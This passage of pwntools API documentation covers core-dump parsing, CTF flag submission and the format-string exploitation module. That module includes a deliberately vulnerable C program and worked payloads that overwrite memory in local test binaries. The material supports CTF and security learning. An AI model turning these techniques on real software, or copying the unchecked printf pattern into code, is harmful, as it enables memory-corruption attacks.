<code class="descname">prstatus</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.prstatus" title="Permalink to this definition">¶</a></dt>
<dd><p>The NT_PRSTATUS object.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.registers">
<code class="descname">registers</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.registers" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">dict</span></code></a> &#8211; All available registers in the coredump.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="s1">&#39;mov eax, 0xdeadbeef;&#39;</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">trap</span><span class="p">(),</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">corefile</span><span class="o">.</span><span class="n">registers</span><span class="p">[</span><span class="s1">&#39;eax&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.siginfo">
<code class="descname">siginfo</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.siginfo" title="Permalink to this definition">¶</a></dt>
<dd><p>The NT_SIGINFO object</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.signal">
<code class="descname">signal</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.signal" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Signal which caused the core to be dumped.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">trap</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">corefile</span><span class="o">.</span><span class="n">signal</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGTRAP</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">crash</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">corefile</span><span class="o">.</span><span class="n">signal</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGSEGV</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.sp">
<code class="descname">sp</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.sp" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; The program counter for the Corefile</p>
<p>This is a cross-platform way to get e.g. <code class="docutils literal"><span class="pre">core.esp</span></code>, <code class="docutils literal"><span class="pre">core.rsp</span></code>, etc.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.stack">
<code class="descname">stack</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.stack" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Address of the stack base</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.vdso">
<code class="descname">vdso</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.vdso" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.corefile.Mapping" title="pwnlib.elf.corefile.Mapping"><code class="xref py py-class docutils literal"><span class="pre">Mapping</span></code></a> &#8211; Mapping for the vdso section</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.vsyscall">
<code class="descname">vsyscall</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.vsyscall" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.corefile.Mapping" title="pwnlib.elf.corefile.Mapping"><code class="xref py py-class docutils literal"><span class="pre">Mapping</span></code></a> &#8211; Mapping for the vsyscall section</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.vvar">
<code class="descname">vvar</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.vvar" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.corefile.Mapping" title="pwnlib.elf.corefile.Mapping"><code class="xref py py-class docutils literal"><span class="pre">Mapping</span></code></a> &#8211; Mapping for the vvar section</p>
</dd></dl>

</dd></dl>

<dl class="class">
<dt id="pwnlib.elf.corefile.Mapping">
<em class="property">class </em><code class="descclassname">pwnlib.elf.corefile.</code><code class="descname">Mapping</code><span class="sig-paren">(</span><em>core</em>, <em>name</em>, <em>start</em>, <em>stop</em>, <em>flags</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping" title="Permalink to this definition">¶</a></dt>
<dd><p>Encapsulates information about a memory mapping in a <a class="reference internal" href="#pwnlib.elf.corefile.Corefile" title="pwnlib.elf.corefile.Corefile"><code class="xref py py-class docutils literal"><span class="pre">Corefile</span></code></a>.</p>
<dl class="method">
<dt id="pwnlib.elf.corefile.Mapping.find">
<code class="descname">find</code><span class="sig-paren">(</span><em>sub</em>, <em>start=None</em>, <em>end=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py#L228-240"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.find" title="Permalink to this definition">¶</a></dt>
<dd><p>Similar to str.find() but works on our address space</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.corefile.Mapping.rfind">
<code class="descname">rfind</code><span class="sig-paren">(</span><em>sub</em>, <em>start=None</em>, <em>end=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py#L242-254"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.rfind" title="Permalink to this definition">¶</a></dt>
<dd><p>Similar to str.rfind() but works on our address space</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Mapping.address">
<code class="descname">address</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.address" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Alias for <a class="reference internal" href="#pwnlib.elf.corefile.Mapping.start" title="pwnlib.elf.corefile.Mapping.start"><code class="xref py py-data docutils literal"><span class="pre">Mapping.start</span></code></a>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Mapping.data">
<code class="descname">data</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.data" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Memory of the mapping.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Mapping.flags">
<code class="descname">flags</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.flags" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Mapping flags, using e.g. <code class="docutils literal"><span class="pre">PROT_READ</span></code> and so on.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Mapping.name">
<code class="descname">name</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.name" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Name of the mapping, e.g. <code class="docutils literal"><span class="pre">'/bin/bash'</span></code> or <code class="docutils literal"><span class="pre">'[vdso]'</span></code>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Mapping.path">
<code class="descname">path</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.path" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Alias for <a class="reference internal" href="#pwnlib.elf.corefile.Mapping.name" title="pwnlib.elf.corefile.Mapping.name"><code class="xref py py-attr docutils literal"><span class="pre">Mapping.name</span></code></a></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Mapping.permstr">
<code class="descname">permstr</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.permstr" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Human-readable memory permission string, e.g. <code class="docutils literal"><span class="pre">r-xp</span></code>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Mapping.size">
<code class="descname">size</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.size" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Size of the mapping, in bytes</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Mapping.start">
<code class="descname">start</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.start" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; First mapped byte in the mapping</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Mapping.stop">
<code class="descname">stop</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Mapping.stop" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; First byte after the end of hte mapping</p>
</dd></dl>

</dd></dl>

</div>
</div>
</div>
</div>
</div>
<span id="document-exception"></span><div class="section" id="module-pwnlib.exception">
<span id="pwnlib-exception-pwnlib-exceptions"></span><h3><a class="reference internal" href="#module-pwnlib.exception" title="pwnlib.exception"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.exception</span></code></a> &#8212; Pwnlib exceptions<a class="headerlink" href="#module-pwnlib.exception" title="Permalink to this headline">¶</a></h3>
<dl class="exception">
<dt id="pwnlib.exception.PwnlibException">
<em class="property">exception </em><code class="descclassname">pwnlib.exception.</code><code class="descname">PwnlibException</code><span class="sig-paren">(</span><em>msg</em>, <em>reason=None</em>, <em>exit_code=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/exception.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.exception.PwnlibException" title="Permalink to this definition">¶</a></dt>
<dd><p>Exception thrown by <code class="xref py py-func docutils literal"><span class="pre">pwnlib.log.error()</span></code>.</p>
<p>Pwnlib functions that encounters unrecoverable errors should call the
<code class="xref py py-func docutils literal"><span class="pre">pwnlib.log.error()</span></code> function instead of throwing this exception directly.</p>
<p>bar</p>
</dd></dl>

</div>
<span id="document-flag"></span><div class="section" id="module-pwnlib.flag">
<span id="pwnlib-flag-ctf-flag-management"></span><h3><a class="reference internal" href="#module-pwnlib.flag" title="pwnlib.flag"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.flag</span></code></a> &#8212; CTF Flag Management<a class="headerlink" href="#module-pwnlib.flag" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.flag.submit_flag">
<code class="descclassname">pwnlib.flag.</code><code class="descname">submit_flag</code><span class="sig-paren">(</span><em>flag</em>, <em>exploit='unnamed-exploit'</em>, <em>target='unknown-target'</em>, <em>server='flag-submission-server'</em>, <em>port='31337'</em>, <em>proto='tcp'</em>, <em>team='unknown-team'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/flag.py#L21-73"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.flag.submit_flag" title="Permalink to this definition">¶</a></dt>
<dd><p>Submits a flag to the game server</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>flag</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The flag to submit.</li>
<li><strong>exploit</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Exploit identifier, optional</li>
<li><strong>target</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Target identifier, optional</li>
<li><strong>server</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Flag server host name, optional</li>
<li><strong>port</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Flag server port, optional</li>
<li><strong>proto</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; </li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>Optional arguments are inferred from the environment,
or omitted if none is set.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">A string indicating the status of the key submission,
or an error code.</td>
</tr>
</tbody>
</table>
<p>Doctest:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span> <span class="o">=</span> <span class="n">submit_flag</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="n">server</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">l</span><span class="o">.</span><span class="n">lport</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
<span class="go">[&#39;flag&#39;, &#39;unnamed-exploit&#39;, &#39;unknown-target&#39;, &#39;unknown-team&#39;]</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-fmtstr"></span><div class="section" id="module-pwnlib.fmtstr">
<span id="pwnlib-fmtstr-format-string-bug-exploitation-tools"></span><h3><a class="reference internal" href="#module-pwnlib.fmtstr" title="pwnlib.fmtstr"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.fmtstr</span></code></a> &#8212; Format string bug exploitation tools<a class="headerlink" href="#module-pwnlib.fmtstr" title="Permalink to this headline">¶</a></h3>
<p>Provide some tools to exploit format string bug</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">program</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">mktemp</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">source</span>  <span class="o">=</span> <span class="n">program</span> <span class="o">+</span> <span class="s2">&quot;.c&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">write</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="gp">... </span><span class="s1">#include &lt;stdio.h&gt;</span>
<span class="gp">... </span><span class="s1">#include &lt;stdlib.h&gt;</span>
<span class="gp">... </span><span class="s1">#include &lt;unistd.h&gt;</span>
<span class="gp">... </span><span class="s1">#include &lt;sys/mman.h&gt;</span>
<span class="gp">... </span><span class="s1">#define MEMORY_ADDRESS ((void*)0x11111000)</span>
<span class="gp">... </span><span class="s1">#define MEMORY_SIZE 1024</span>
<span class="gp">... </span><span class="s1">#define TARGET ((int *) 0x11111110)</span>
<span class="gp">... </span><span class="s1">int main(int argc, char const *argv[])</span>
<span class="gp">... </span><span class="s1">{</span>
<span class="gp">... </span><span class="s1">       char buff[1024];</span>
<span class="gp">... </span><span class="s1">       void *ptr = NULL;</span>
<span class="gp">... </span><span class="s1">       int *my_var = TARGET;</span>
<span class="gp">... </span><span class="s1">       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);</span>
<span class="gp">... </span><span class="s1">       if(ptr != MEMORY_ADDRESS)</span>
<span class="gp">... </span><span class="s1">       {</span>
<span class="gp">... </span><span class="s1">               perror(&quot;mmap&quot;);</span>
<span class="gp">... </span><span class="s1">               return EXIT_FAILURE;</span>
<span class="gp">... </span><span class="s1">       }</span>
<span class="gp">... </span><span class="s1">       *my_var = 0x41414141;</span>
<span class="gp">... </span><span class="s1">       write(1, &amp;my_var, sizeof(int *));</span>
<span class="gp">... </span><span class="s1">       scanf(&quot;</span><span class="si">%s</span><span class="s1">&quot;, buff);</span>
<span class="gp">... </span><span class="s1">       dprintf(2, buff);</span>
<span class="gp">... </span><span class="s1">       write(1, my_var, sizeof(int));</span>
<span class="gp">... </span><span class="s1">       return 0;</span>
<span class="gp">... </span><span class="s1">}&#39;&#39;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cmdline</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;gcc&quot;</span><span class="p">,</span> <span class="n">source</span><span class="p">,</span> <span class="s2">&quot;-Wno-format-security&quot;</span><span class="p">,</span> <span class="s2">&quot;-m32&quot;</span><span class="p">,</span> <span class="s2">&quot;-o&quot;</span><span class="p">,</span> <span class="n">program</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">process</span><span class="p">(</span><span class="n">cmdline</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_close</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">exec_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
<span class="gp">... </span>    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">program</span><span class="p">)</span>
<span class="gp">... </span>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="gp">... </span>    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="gp">...</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">autofmt</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">exec_fmt</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">offset</span> <span class="o">=</span> <span class="n">autofmt</span><span class="o">.</span><span class="n">offset</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="p">{</span><span class="n">addr</span><span class="p">:</span> <span class="mh">0x1337babe</span><span class="p">})</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)))</span>
<span class="go">0x1337babe</span>
</pre></div>
</div>
<div class="section" id="example-payload-generation">
<h4>Example - Payload generation<a class="headerlink" href="#example-payload-generation" title="Permalink to this headline">¶</a></h4>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># we want to do 3 writes</span>
<span class="n">writes</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x08041337</span><span class="p">:</span>   <span class="mh">0xbfffffff</span><span class="p">,</span>
          <span class="mh">0x08041337</span><span class="o">+</span><span class="mi">4</span><span class="p">:</span> <span class="mh">0x1337babe</span><span class="p">,</span>
          <span class="mh">0x08041337</span><span class="o">+</span><span class="mi">8</span><span class="p">:</span> <span class="mh">0xdeadbeef</span><span class="p">}</span>

<span class="c1"># the printf() call already writes some bytes</span>
<span class="c1"># for example :</span>
<span class="c1"># strcat(dest, &quot;blabla :&quot;, 256);</span>
<span class="c1"># strcat(dest, your_input, 256);</span>
<span class="c1"># printf(dest);</span>
<span class="c1"># Here, numbwritten parameter must be 8</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">writes</span><span class="p">,</span> <span class="n">numbwritten</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="section" id="example-automated-exploitation">
<h4>Example - Automated exploitation<a class="headerlink" href="#example-automated-exploitation" title="Permalink to this headline">¶</a></h4>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Assume a process that reads a string</span>
<span class="c1"># and gives this string as the first argument</span>
<span class="c1"># of a printf() call</span>
<span class="c1"># It do this indefinitely</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vulnerable&#39;</span><span class="p">)</span>

<span class="c1"># Function called in order to send a payload</span>
<span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;payload = </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="c1"># Create a FmtStr object and give to him the function</span>
<span class="n">format_string</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">execute_fmt</span><span class="o">=</span><span class="n">send_payload</span><span class="p">)</span>
<span class="n">format_string</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1337babe</span><span class="p">)</span> <span class="c1"># write 0x1337babe at 0x0</span>
<span class="n">format_string</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mh">0x1337babe</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span> <span class="c1"># write 0x0 at 0x1337babe</span>
<span class="n">format_string</span><span class="o">.</span><span class="n">execute_writes</span><span class="p">()</span>
</pre></div>
</div>
<dl class="class">
<dt id="pwnlib.fmtstr.FmtStr">
<em class="property">class </em><code class="descclassname">pwnlib.fmtstr.</code><code class="descname">FmtStr</code><span class="sig-paren">(</span><em>execute_fmt</em>, <em>offset=None</em>, <em>padlen=0</em>, <em>numbwritten=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/fmtstr.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.fmtstr.FmtStr" title="Permalink to this definition">¶</a></dt>
<dd><p>Provides an automated format string exploitation.</p>
<p>It takes a function which is called every time the automated
process want to communicate with the vulnerable process. this
function takes a parameter with the payload that you have to
send to the vulnerable process and must return the process
returns.</p>
<p>If the <cite>offset</cite> parameter is not given, then try to find the right
offset by leaking stack data.</p>
